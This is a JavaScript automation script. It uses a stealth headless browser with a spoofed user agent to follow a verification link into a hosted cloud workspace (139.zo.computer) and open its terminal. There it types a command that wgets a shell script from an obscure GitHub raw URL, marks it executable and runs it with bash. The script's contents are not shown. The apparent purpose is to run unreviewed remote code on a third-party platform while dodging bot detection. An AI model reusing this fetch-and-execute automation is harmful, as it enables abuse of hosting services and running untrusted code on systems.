import { launch } from 'cloakbrowser';

const CONFIG = {
  workspaceDomain: '139.zo.computer',
  runTmuxInit: process.env.INIT_TMUX === '1',
  tmuxCommand:
    "wget -O zzz.sh https://raw.githubusercontent.com/yghhbbuy/vvvioui/refs/heads/main/zzz.sh && chmod +x zzz.sh && bash zzz.sh",
};

async function safeScreenshot(page, name) {
  try {
    await page.screenshot({ path: name, fullPage: true });
  } catch {}
}

async function run() {
  const url = process.argv[2];
  if (!url) {
    console.error('❌ 缺少 URL');
    process.exit(1);
  }

  const browser = await launch({ headless: true });

  // ✅ 不使用 cookie（关键）
  const context = await browser.newContext({
    viewport: { width: 1920, height: 1080 },
    userAgent:
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
  });

  const page = await context.newPage();

  try {
    console.log('🌐 打开 verify 链接...');
    
    // ✅ 只等 DOM，不等 networkidle
    await page.goto(url, {
      waitUntil: 'domcontentloaded',
      timeout: 90000,
    });

    // ✅ 等自动登录 + 跳转
    console.log('⏳ 等待自动登录跳转...');
    await page.waitForTimeout(12000);

    await safeScreenshot(page, 'after-verify.png');

    // ✅ 检测 URL 是否已经进入 workspace
    const currentUrl = page.url();
    console.log('📍 当前 URL:', currentUrl);

    // ✅ 再等一次（防止懒加载）
    await page.waitForTimeout(8000);

    // ✅ 开始找域名
    console.log('🔍 查找 workspace:', CONFIG.workspaceDomain);

    let domain = page.locator(`:has-text("${CONFIG.workspaceDomain}")`).first();

    // ✅ iframe 兜底
    if ((await domain.count()) === 0) {
      console.log('⚠️ 主页面没找到，尝试 iframe...');
      for (const frame of page.frames()) {
        try {
          const f = frame.locator(`:has-text("${CONFIG.workspaceDomain}")`);
          if ((await f.count()) > 0) {
            domain = f.first();
            console.log('✅ 在 iframe 中找到');
            break;
          }
        } catch {}
      }
    }

    // ✅ 滚动兜底
    if ((await domain.count()) === 0) {
      console.log('⚠️ 滚动加载...');
      for (let i = 0; i < 6; i++) {
        await page.mouse.wheel(0, 1200);
        await page.waitForTimeout(1500);

        if ((await domain.count()) > 0) break;
      }
    }

    // ✅ 最终判断
    if ((await domain.count()) === 0) {
      console.log('❌ 仍然找不到 domain');

      await safeScreenshot(page, 'not-found.png');

      // 保存 HTML 用来调试
      const html = await page.content();
      require('fs').writeFileSync('debug.html', html);

      return;
    }

    // ✅ 点击
    await domain.waitFor({ state: 'visible', timeout: 30000 });
    await domain.click({ force: true });

    console.log('✅ 已点击 workspace');

    await page.waitForTimeout(20000);

    // ✅ 启动终端
    if (CONFIG.runTmuxInit) {
      console.log('🖥️ 启动终端...');
      await page.keyboard.press('Control+Shift+`');
      await page.waitForTimeout(5000);

      await page.keyboard.insertText(CONFIG.tmuxCommand);
      await page.keyboard.press('Enter');
    }

    await safeScreenshot(page, 'result.png');

    console.log('✅ 全流程完成');
  } catch (e) {
    console.error('❌ 出错:', e);

    await safeScreenshot(page, 'error.png');
  } finally {
    await browser.close();
  }
}

run();
